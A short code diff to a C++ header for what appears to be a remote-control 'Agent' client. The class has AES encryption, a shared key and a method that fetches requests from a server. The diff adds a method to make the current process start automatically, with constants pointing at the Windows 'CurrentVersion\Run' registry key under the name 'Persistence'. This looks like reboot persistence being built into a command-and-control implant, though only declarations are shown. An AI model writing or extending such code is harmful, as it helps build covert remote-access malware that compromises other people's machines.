@@ -8,6 +8,7 @@
 #include "AES_crypto.h"
 //#include "aes.h"
 #include <Windows.h>
+#include <winreg.h>
 #include <vector>
 #include <sstream>
 #include <algorithm>
@@ -40,6 +41,11 @@ private:
 	void CreateNewSymetricKeyWithThread();
 	void GetRequestFromServer();
 public:
+	BOOL set_curr_proc_to_autostart();
+	LPCWSTR AUTO_START_NAME = (LPCWSTR)TEXT("Persistence");
+	LPCWSTR AUTO_START_PATH = (LPCWSTR)TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+
+
 	Agent();
 	string sharedKey;
 
